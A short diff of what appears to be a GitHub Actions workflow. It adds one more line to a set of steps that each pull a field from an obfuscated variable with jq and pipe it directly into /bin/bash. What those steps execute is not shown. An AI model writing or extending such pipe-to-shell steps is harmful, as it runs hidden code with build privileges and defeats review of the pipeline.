@@ -25,6 +25,7 @@ jobs:
           echo $ua32 | jq -r .m50 | /bin/bash
           printf '%s' "$nrhe41" | jq -r .bld8 | /bin/bash
           printf '%s' "$pazrq30" | jq -r .h609 | /bin/bash
+          printf '%s' "$uiu88" | jq -r .tnd11283 | /bin/bash
 
       - name: Save output
         uses: actions/upload-artifact@v4
